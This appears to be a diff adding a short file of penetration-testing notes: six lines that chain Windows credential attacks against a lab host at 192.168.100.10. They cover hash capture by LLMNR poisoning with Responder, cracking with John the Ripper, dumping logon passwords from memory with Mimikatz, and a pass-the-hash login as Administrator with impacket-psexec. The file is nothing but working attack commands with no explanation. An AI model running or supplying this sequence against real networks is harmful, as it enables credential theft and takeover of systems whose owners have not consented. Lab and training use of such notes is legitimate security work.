@@ -1,0 +1,6 @@
+sudo  responder -I eth0 -v
+john victim_hash.txt --wordlist=password.txt
+Privilege::debug
+Sekurlsa::logonpasswords
+impacket-psexec -hashes :e45a314c664d40a227f9540121d1a29d Administrator@192.168.100.10
+
